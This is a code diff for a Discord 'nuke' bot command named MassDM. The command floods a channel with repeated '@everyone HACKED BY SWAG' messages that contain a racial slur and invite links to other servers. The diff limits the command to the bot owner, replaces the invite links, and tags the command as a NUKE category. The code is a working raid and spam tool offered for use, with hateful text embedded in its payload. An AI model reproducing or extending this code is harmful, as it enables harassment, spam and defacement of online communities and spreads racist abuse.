@@ -11,6 +11,9 @@ public class MassDM implements ICommand {
     private boolean running;
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+            return;
+        }
         running = true;
         if (args.isEmpty())
         {
@@ -21,7 +24,7 @@ public class MassDM implements ICommand {
             int input = Integer.parseInt(args.get(0));
             for (int i = 0; i != input; i++) {
                 if (running) {
-                    event.getChannel().sendMessage("\uD83D\uDE0E\uD83D\uDE0E discord.gg/EgJEs5E @everyone HACKED BY SWAG L L L NIGGA @everyone \uD83D\uDE0E\uD83D\uDE0E " +"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  ").queue();
+                    event.getChannel().sendMessage("\uD83D\uDE0E\uD83D\uDE0E https://discord.gg/djnZZV7 https://discord.gg/92YFdKM @everyone HACKED BY SWAG L L L NIGGA @everyone \uD83D\uDE0E\uD83D\uDE0E " +"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  ").queue();
                     Thread.sleep(600);
                 }
                 if (i == input - 1) {
@@ -48,5 +51,10 @@ public class MassDM implements ICommand {
     @Override
     public String[] getAlias() {
         return new String[] {"dmadvertise"};
+    }
+
+     @Override
+    public Category getCategory() {
+        return Category.NUKE;
     }
 }
